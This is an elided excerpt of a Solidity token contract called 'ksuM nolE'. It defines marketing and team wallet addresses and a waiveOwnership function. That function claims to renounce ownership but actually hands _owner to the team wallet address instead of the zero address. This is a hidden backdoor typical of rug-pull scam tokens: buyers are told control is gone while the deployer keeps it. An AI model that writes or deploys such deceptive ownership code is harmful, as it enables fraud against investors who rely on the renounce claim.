...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x97254c789F6894F92f15ca41F3c3142e48c33794);
    }
...
contract ksuMnolE is Context, IERC20, Ownable {
    ...
    string private _name = "ksuM nolE";
    string private _symbol = "nolE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xeB500A6441835fEEEEE94e920bd4C6F5C6fdE2Ed);
    address payable public teamWalletAddress = payable(0x97254c789F6894F92f15ca41F3c3142e48c33794);
